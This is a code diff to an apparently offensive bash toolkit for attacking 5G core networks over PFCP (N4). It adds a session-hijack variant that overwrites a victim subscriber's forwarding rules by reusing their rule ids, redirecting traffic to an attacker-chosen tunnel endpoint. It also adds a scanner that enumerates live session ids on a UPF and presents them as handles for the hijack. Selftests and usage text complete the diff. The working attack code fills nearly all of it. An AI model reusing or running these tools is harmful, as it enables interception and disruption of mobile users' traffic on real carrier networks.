@@ -946,6 +946,68 @@ ncore_cmd_pfcp_hijack() {  # <seid> [teid] [attacker-ip] [far-id]
     printf 'blunt\tthe UPF does not authenticate the sender: no key, no certificate, no challenge -- reachability is the whole control\n'
 }
 
+# The duplicate-rule variant. --pfcp-hijack replaces a FAR the attacker names;
+# this one names the ids the victim session already owns, so the UPDATE lands on
+# the victim's own PDR and FAR. A core that keys rules by id inside the session
+# (which is what the field means, TS 29.244 7.5.2) applies the update to the
+# existing rules instead of installing a second set, and the heartbeat traffic
+# the attacker opened for itself is what carries the precedence.
+ncore_pfcp_build_dup() {  # <seid> [pdr-id] [far-id] [teid] [attacker-ip] [seq]
+    local seid="${1:-}" pdr="${2:-1}" far="${3:-1}" teid="${4:-4242}" ap_ip="${5:-127.0.0.1}" seq="${6:-1}"
+    [[ "$seid" =~ ^[0-9]+$ ]] || {
+        printf 'ERROR\t--pfcp-dup needs the session SEID the UPF assigned (it is in the establishment response in the clear)\n' >&2
+        return 2; }
+    [[ "$pdr" =~ ^[0-9]+$ ]] && (( pdr >= 1 && pdr <= 65535 )) || {
+        printf 'ERROR\t--pfcp-dup needs a PDR id in 1..65535\n' >&2; return 2; }
+    [[ "$far" =~ ^[0-9]+$ ]] && (( far >= 1 && far <= 4294967295 )) || {
+        printf 'ERROR\t--pfcp-dup needs a FAR id in 1..4294967295\n' >&2; return 2; }
+    [[ "$teid" =~ ^[0-9]+$ ]] || {
+        printf 'ERROR\t--pfcp-dup TEID must be numeric\n' >&2; return 2; }
+    ncore_pfcp_ipv4_hex "$ap_ip" >/dev/null || {
+        printf 'ERROR\t--pfcp-dup needs an IPv4 address for the new outer header\n' >&2; return 2; }
+
+    local ufp ufar updr body
+    ufp=$(ncore_pfcp_ie 42 00)                          || return 2  # Destination Interface: access
+    ufp+=$(ncore_pfcp_outer_header_creation "$teid" "$ap_ip") || return 2
+    ufar=$(ncore_pfcp_ie 108 "$(ncore_pfcp_u32 "$far")") || return 2
+    ufar+=$(ncore_pfcp_ie 44 02)                         || return 2  # Apply Action: FORW
+    ufar+=$(ncore_pfcp_ie 11 "$ufp")                     || return 2  # Update Forwarding Parameters
+    # Precedence 1 outranks the victim's rule, and the id is the victim's, so the
+    # update is not an addition: it is the same rule with a different answer.
+    updr=$(ncore_pfcp_ie 56 "$(ncore_pfcp_u16 "$pdr")") || return 2
+    updr+=$(ncore_pfcp_ie 29 "$(ncore_pfcp_u32 1)")     || return 2
+    updr+=$(ncore_pfcp_ie 108 "$(ncore_pfcp_u32 "$far")") || return 2
+    body=$(ncore_pfcp_ie 9 "$updr")                      || return 2  # Update PDR
+    body+=$(ncore_pfcp_ie 10 "$ufar")                    || return 2  # Update FAR
+    ncore_pfcp_msg 52 "$seq" "$body" "$seid"             || return 2
+}
+
+ncore_cmd_pfcp_dup() {  # <seid> [pdr-id] [far-id] [teid] [attacker-ip]
+    local seid="${1:-}" pdr="${2:-1}" far="${3:-1}" teid="${4:-4242}" ip="${5:-127.0.0.1}"
+    if [ -z "$seid" ]; then
+        printf 'ERROR\t--pfcp-dup needs the session SEID (from an Establishment Response)\n' >&2
+        return 2
+    fi
+    local hex
+    hex=$(ncore_pfcp_build_dup "$seid" "$pdr" "$far" "$teid" "$ip" 1) || return $?
+    local dec; dec=$(ncore_decode_pfcp "$hex") || return 1
+    printf 'message\tSession Modification Request\n'
+    printf 'message_type\t52\n'
+    printf 'seid\t%s\n' "$(printf '%s\n' "$dec" | awk -F'\t' '$1=="seid"{print $2; exit}')"
+    printf 'octets\t%s\n' "$(( ${#hex} / 2 ))"
+    printf 'hex\t%s\n' "$hex"
+    printf 'update_pdr\t%s\n' "$pdr"
+    printf 'update_far\t%s\n' "$far"
+    printf 'precedence\t1\n'
+    printf 'outer_header_creation\t%s\n' "$(ncore_pfcp_outer_header_creation "$teid" "$ip")"
+    printf 'outer_header_creation_value\t%s\n' \
+        "$(ncore_pfcp_outer_header_creation "$teid" "$ip" | cut -c9-)"
+    printf 'new_endpoint\t%s:%s\n' "$ip" "$teid"
+    printf 'decode_ok\t%s\n' "$([[ -n "$dec" ]] && echo yes || echo no)"
+    printf 'ie_count\t%s\n' "$(printf '%s\n' "$dec" | awk -F'\t' '$1=="ie_count"{print $2; exit}')"
+    printf 'length_agrees\t%s\n' "$(printf '%s\n' "$dec" | awk -F'\t' '$1=="length_agrees"{print $2; exit}')"
+}
+
 ncore_cmd_pfcp_delete() {  # <seid> [seq]
     local seid="${1:-}" seq="${2:-1}"
     [[ "$seid" =~ ^[0-9]+$ ]] || {
@@ -1010,6 +1072,141 @@ ncore_cmd_pfcp_send() {  # <upf-host> [port] [hex] [--wait N]
         printf 'reply_decoded\tnone within %ss\n' "$wait"
     fi
     return "$rc"
+}
+
+# ── T2: SEID enumeration ────────────────────────────────────────────────
+# A Session Modification Request carries the SEID in its header and then the
+# IEs that say what to modify.  TS 29.244 never says what to do with a request
+# that names a SEID and updates nothing, so stacks split: a node that does not
+# hold the session answers "Session context not found", and a node that does
+# answers anything else.  The empty request is therefore a read of the session
+# table -- and because it carries no PDR/FAR/QER/URR it installs nothing, which
+# is the only reason this is safe to point at production.
+#
+# The cause decides, never the header SEID: a response echoes that back whether
+# or not the session exists.
+#
+# Two calibrations, because both failure modes look like success.  A Heartbeat
+# proves the node speaks PFCP at all, and the run reports whether it ever saw a
+# cause-64 -- a node that answers every guess with the same policy error is not
+# resolving SEIDs, and every "exists" would then be invented from a rejection.
+ncore_cmd_pfcp_seid_scan() {  # <upf-host> [--port N] [--seid H] [--from H] [--to H]
+                              #   [--count N] [--seed N] [--timeout S] [--retries N]
+                              #   [--rate N] [--no-heartbeat]
+    local host="" port=8805 seid="" sfrom="" sto="" count=0 seed=0
+    local tmo=1.5 retries=2 rate=8 no_hb=""
+    while (( $# )); do
+        case "$1" in
+            --port)   [[ "${2:-}" =~ ^[0-9]+$ ]] || {
+                          printf 'ERROR\t--port takes a number\n' >&2; return 2; }
+                      port="$2"; shift 2 ;;
+            --seid)   [[ "${2:-}" =~ ^[0-9A-Fa-f]+$ ]] || {
+                          printf 'ERROR\t--seid takes hex; a SEID is 64 bits and decimal invites a typo\n' >&2; return 2; }
+                      seid="$2"; shift 2 ;;
+            --from)   [[ "${2:-}" =~ ^[0-9A-Fa-f]+$ ]] || {
+                          printf 'ERROR\t--from takes a hex SEID\n' >&2; return 2; }
+                      sfrom="$2"; shift 2 ;;
+            --to)     [[ "${2:-}" =~ ^[0-9A-Fa-f]+$ ]] || {
+                          printf 'ERROR\t--to takes a hex SEID\n' >&2; return 2; }
+                      sto="$2"; shift 2 ;;
+            --count)  [[ "${2:-}" =~ ^[0-9]+$ ]] || {
+                          printf 'ERROR\t--count takes a number\n' >&2; return 2; }
+                      count="$2"; shift 2 ;;
+            --seed)   [[ "${2:-}" =~ ^[0-9]+$ ]] || {
+                          printf 'ERROR\t--seed takes a number\n' >&2; return 2; }
+                      seed="$2"; shift 2 ;;
+            --timeout) [[ "${2:-}" =~ ^[0-9]+([.][0-9]+)?$ ]] || {
+                          printf 'ERROR\t--timeout takes seconds\n' >&2; return 2; }
+                      tmo="$2"; shift 2 ;;
+            --retries) [[ "${2:-}" =~ ^[0-9]+$ ]] || {
+                          printf 'ERROR\t--retries takes a number\n' >&2; return 2; }
+                      retries="$2"; shift 2 ;;
+            --rate)   [[ "${2:-}" =~ ^[0-9]+([.][0-9]+)?$ ]] || {
+                          printf 'ERROR\t--rate takes probes per second\n' >&2; return 2; }
+                      rate="$2"; shift 2 ;;
+            --no-heartbeat) no_hb="--no-heartbeat"; shift ;;
+            -*)       printf 'ERROR\t--pfcp-seid-scan does not take %s\n' "$1" >&2; return 2 ;;
+            *)        if [[ -z "$host" ]]; then host="$1"
+                      else printf 'ERROR\t--pfcp-seid-scan takes one <upf-host>\n' >&2; return 2; fi
+                      shift ;;
+        esac
+    done
+    if [[ -z "$host" || "$host" =~ ^[0-9]+$ ]]; then
+        printf 'ERROR\t--pfcp-seid-scan needs a <upf-host>; a port on its own is not a host\n' >&2
+        return 2
+    fi
+    local tool="$IMSISTING_ROOT/tools/pfcp_probe.py"
+    [[ -f "$tool" ]] || { printf 'ERROR\t%s is missing; cannot probe\n' "$tool" >&2; return 1; }
+
+    local -a pargs=(--port "$port" --timeout "$tmo" --retries "$retries" --rate "$rate")
+    [[ -n "$seid"  ]] && pargs+=(--seid "$seid")
+    [[ -n "$sfrom" ]] && pargs+=(--from "$sfrom")
+    [[ -n "$sto"   ]] && pargs+=(--to "$sto")
+    (( count > 0 )) && pargs+=(--count "$count" --seed "$seed")
+    [[ -n "$no_hb" ]] && pargs+=("$no_hb")
+
+    printf 'leg\tPFCP (N4)\n'
+    printf 'target\t%s:%s\n' "$host" "$port"
+    printf 'encapsulation\tudp\n'
+    printf 'request\tsession-modification-request type 52, empty body: it names a SEID and\n'
+    printf '\tupdates nothing, so a node that accepts it changed no forwarding state\n'
+
+    # A silent peer costs retries x timeout per SEID, plus the two heartbeats.
+    local nprobe=$count
+    (( nprobe < 1 )) && nprobe=1
+    local budget
+    budget=$(awk -v n="$nprobe" -v r="$retries" -v t="$tmo" \
+             'BEGIN{b=(n+2)*(r+1)*t+90; if (b<120) b=120; printf "%d", b}')
+    local out="" rc=0
+    out=$(timeout "$budget" python3 "$tool" "$host" "${pargs[@]}" 2>&1) || rc=$?
+    if (( rc == 124 )); then
+        printf 'ERROR\tno result within %ss: a silent peer costs retries x timeout per SEID\n' \
+               "$budget" >&2
+        return 124
+    fi
+    printf '%s\n' "$out"
+
+    local hb oracle rows exists absent unobs
+    hb=$(printf '%s\n' "$out" | awk -F'\t' '$1=="STATE" && $2=="heartbeat"{print $3; exit}')
+    oracle=$(printf '%s\n' "$out" | awk -F'\t' '$1=="STATE" && $2=="oracle"{print $3; exit}')
+    rows=$(printf '%s\n' "$out" | grep -c '^ROW')
+    exists=$(printf '%s\n' "$out" | awk -F'\t' '$1=="ROW" && $3=="exists"' | wc -l)
+    absent=$(printf '%s\n' "$out" | awk -F'\t' '$1=="ROW" && $3=="absent"' | wc -l)
+    unobs=$(printf '%s\n' "$out" | awk -F'\t' '$1=="ROW" && $3=="unobserved"' | wc -l)
+    printf 'heartbeat\t%s\n' "${hb:-not-run}"
+    printf 'oracle\t%s\n' "${oracle:-unknown}"
+    printf 'rows\t%s\n' "$rows"
+    printf 'seid_in_use\t%s\n' "$exists"
+    printf 'seid_absent\t%s\n' "$absent"
+    printf 'unobserved\t%s\n' "$unobs"
+
+    # The three outcomes that must not be read as "nothing there".
+    if [[ "$oracle" != "present" ]]; then
+        printf 'claim\tnone: this node is not resolving SEIDs, so no row above says a session exists or does not; no SEID is reported as in use\n'
+    elif [[ "$hb" != "answered" ]]; then
+        printf 'claim\tnone: the heartbeat never came back, so the UDP path to %s:%s is unproven and silence there measures our own reachability\n' "$host" "$port"
+    elif (( exists > 0 )); then
+        printf 'claim\t%s SEID(s) resolved: the node accepted a modification naming them with an empty body, which only a live session context does\n' "$exists"
+        printf 'next\tthose SEIDs are the handle for --pfcp-hijack / --pfcp-dup; an accepted empty modification is a read, and what makes it worth having is that the same SEID will also accept a written one\n'
+    else
+        printf 'claim\tno SEID resolved in this range; a negative for these guesses, not evidence the node holds no sessions\n'
+        printf 'next\tthe SEID space is 64 bits, so widening is only worth it once a --pfcp-send has proven the node answers at all\n'
+    fi
+
+    if (( rows > 0 )); then
+        local db="$NCORE_DIR/pfcp_seid_scan.tsv"
+        mkdir -p "$NCORE_DIR" 2>/dev/null || true
+        if [[ ! -s "$db" ]]; then
+            printf 'utc\tpeer\tport\theartbeat\toracle\tseid\tverdict\trtt_ms\tcause\tdetail\n' > "$db"
+        fi
+        local now; now=$(date -u +%Y-%m-%dT%H:%M:%SZ)
+        printf '%s\n' "$out" | awk -F'\t' -v now="$now" -v peer="$host" -v port="$port" \
+            -v hb="${hb:-}" -v orc="${oracle:-}" '$1=="ROW"{
+                printf "%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n",
+                       now, peer, port, hb, orc, $2, $3, $4, $5, $6}' >> "$db"
+        printf 'saved\t%s\n' "$db"
+    fi
+    return 0
 }
 
 # ── XnAP encoders ───────────────────────────────────────────────────────
@@ -2332,6 +2529,29 @@ ncore_selftest() {
     out=$(ncore_cmd_pfcp_hijack)
     chk hijack-noarg  "$(ncore_cmd_pfcp_hijack >/dev/null 2>&1; echo $?)" "2"
     chk hijack-bad-ip "$(ncore_cmd_pfcp_hijack 1 4242 300.1.1.1 >/dev/null 2>&1; echo $?)" "2"
+    # C4b -- the duplicate-rule variant: the ids are the victim's own, so the
+    # update lands on the rules already installed for that subscriber.
+    out=$(ncore_cmd_pfcp_dup 987654321 7 9 4242 203.0.113.9)
+    chk dup-name   "$(fld "$out" message)"        "Session Modification Request"
+    chk dup-type   "$(fld "$out" message_type)"   "52"
+    chk dup-seid   "$(fld "$out" seid)"           "987654321"
+    chk dup-pdr    "$(fld "$out" update_pdr)"     "7"
+    chk dup-far    "$(fld "$out" update_far)"     "9"
+    chk dup-prec   "$(fld "$out" precedence)"     "1"
+    chk dup-ie     "$(fld "$out" ie_count)"       "2"
+    chk dup-dec    "$(fld "$out" decode_ok)"      "yes"
+    chk dup-len    "$(fld "$out" length_agrees)"  "yes"
+    h=$(fld "$out" hex)
+    chk dup-ie-pdr "$(fld "$(ncore_decode_pfcp "$h")" ie.0.name)"  "Update PDR"
+    chk dup-ie-far "$(fld "$(ncore_decode_pfcp "$h")" ie.1.name)"  "Update FAR"
+    # The walk numbers a grouped IE's children from 0, so PDR ID is ie.0.0 and
+    # the outer header creation sits two levels down at ie.1.2.1.
+    chk dup-pdr-id "$(fld "$(ncore_decode_pfcp "$h")" ie.0.0.value)" "0007"
+    chk dup-ohc-id "$(fld "$(ncore_decode_pfcp "$h")" ie.1.2.1.value)" "000100001092CB007109"
+    chk dup-ohc    "$(fld "$out" outer_header_creation_value)" "000100001092CB007109"
+    chk dup-noarg  "$(ncore_cmd_pfcp_dup >/dev/null 2>&1; echo $?)" "2"
+    chk dup-bad-pdr "$(ncore_cmd_pfcp_dup 1 0 >/dev/null 2>&1; echo $?)" "2"
+    chk dup-bad-ip "$(ncore_cmd_pfcp_dup 1 7 9 4242 300.1.1.1 >/dev/null 2>&1; echo $?)" "2"
     out=$(ncore_cmd_pfcp_delete 123456789)
     chk delete-type   "$(fld "$out" message_type)"         "54"
     chk delete-seid   "$(fld "$out" seid)"                 "123456789"
@@ -2386,6 +2606,17 @@ ncore_selftest() {
     chk pfcp-node-noseid  "$(fld "$out" seid_present)"    "no"
     chk pfcp-node-len     "$(fld "$out" length)"          "4"
     chk pfcp-send-no-host      "$(ncore_cmd_pfcp_send >/dev/null 2>&1; echo $?)" "2"
+    # T2 refusals only: a selftest runs with no network, so the probe itself is
+    # exercised by hand.  What is asserted here is that it is wired, that it
+    # names what is missing, and that the octets it would send are correct.
+    chk pfcp-seid-no-host     "$(ncore_cmd_pfcp_seid_scan >/dev/null 2>&1; echo $?)" "2"
+    chk pfcp-seid-no-host-msg "$(ncore_cmd_pfcp_seid_scan 2>&1 | grep -c 'needs a <upf-host>')" "1"
+    chk pfcp-seid-bad-seid    "$(ncore_cmd_pfcp_seid_scan 10.0.0.1 --seid zz >/dev/null 2>&1; echo $?)" "2"
+    chk pfcp-seid-bad-count   "$(ncore_cmd_pfcp_seid_scan 10.0.0.1 --count x >/dev/null 2>&1; echo $?)" "2"
+    chk pfcp-seid-tool        "$([ -f "$IMSISTING_ROOT/tools/pfcp_probe.py" ] && echo yes)" "yes"
+    # The empty modification request: type 52, S=1, length 12 (SEID 8 + sequence
+    # 3 + spare 1) and NO IEs -- an IE here would make it a write, not a read.
+    chk pfcp-seid-empty-hex "$(python3 -c 'import sys;sys.path.insert(0,sys.argv[1]);import pfcp_probe as P;b=P.session_mod_empty(0x1122334455667788);print("ok" if b.hex()=="2134000c112233445566778800000100" and int.from_bytes(b[2:4],"big")==len(b)-4 else "bad")' "$IMSISTING_ROOT/tools" 2>/dev/null)" "ok"
     chk send-no-arming "$(grep -cE '^[[:space:]]*printf .status.{1,3}disarmed' "${BASH_SOURCE[0]}")" "0"
 
     # 8. PFCP IE table: the real IE type numbers.
@@ -2697,9 +2928,11 @@ ncore_cli_main() {
         --pfcp-build)      ncore_cmd_pfcp_build "${1:-1}" "${2:-10.45.0.2}" "${3:-1}" \
                                                 "${4:-0}" "${5:-10.45.0.1}" ;;
         --pfcp-send)       ncore_cmd_pfcp_send "$@" ;;
+        --pfcp-seid-scan)  ncore_cmd_pfcp_seid_scan "$@" ;;
         --ctx-bind)        ncore_cmd_ctx_bind "${1:-}" ;;
         --kairos)          ncore_cmd_kairos "$@" ;;
         --pfcp-hijack)     ncore_cmd_pfcp_hijack "${1:-}" "${2:-4242}" "${3:-127.0.0.1}" "${4:-1}" ;;
+        --pfcp-dup)        ncore_cmd_pfcp_dup "${1:-}" "${2:-1}" "${3:-1}" "${4:-4242}" "${5:-127.0.0.1}" ;;
         --pfcp-delete)     ncore_cmd_pfcp_delete "${1:-}" "${2:-1}" ;;
         --ngap-initial-ue)  ncore_cmd_ngap_initial_ue "${1:-}" "${2:-}" "${3:-}" "${4:-}" ;;
         --ngap-downlink-nas) ncore_cmd_ngap_downlink_nas "${1:-}" "${2:-}" "${3:-}" ;;
@@ -2737,6 +2970,11 @@ Usage: $0 COMMAND
   --pfcp-build [teid] [ue-ip] [seq] [seid] [upf-ip]
                                 build a Session Establishment Request (type 50)
   --pfcp-send <upf-host> [port] [hex] [--wait N]   UDP 8805, then read the reply
+  --pfcp-seid-scan <upf-host> [--seid H|--from H --to H|--count N]
+                                T2: name a SEID with an EMPTY Session
+                                Modification Request; a node that holds it
+                                answers anything but "context not found",
+                                and nothing is installed either way
   --kairos <proc-a> <proc-b>             K2: the offset window where two
                                         procedures break the state machine
   --ctx-bind <journal.tsv>               K1: whose context the core believed
@@ -2744,6 +2982,11 @@ Usage: $0 COMMAND
   --pfcp-hijack <seid> [teid] [attacker-ip] [far-id]
                                 C4: the Session Modification Request that
                                 repoints a live session at your tunnel
+  --pfcp-dup <seid> [pdr-id] [far-id] [teid] [attacker-ip]
+                                C4b: the modification that reuses the victim's
+                                own rule ids, so a core that resolves rules by
+                                id overwrites the forwarding instead of adding
+                                a second one
   --pfcp-delete <seid> [seq]    one datagram that tears the session down
                                 send it on UDP 8805
   --ngap-initial-ue [ran-ue-id] [nas-hex] [nci-hex] [cause]
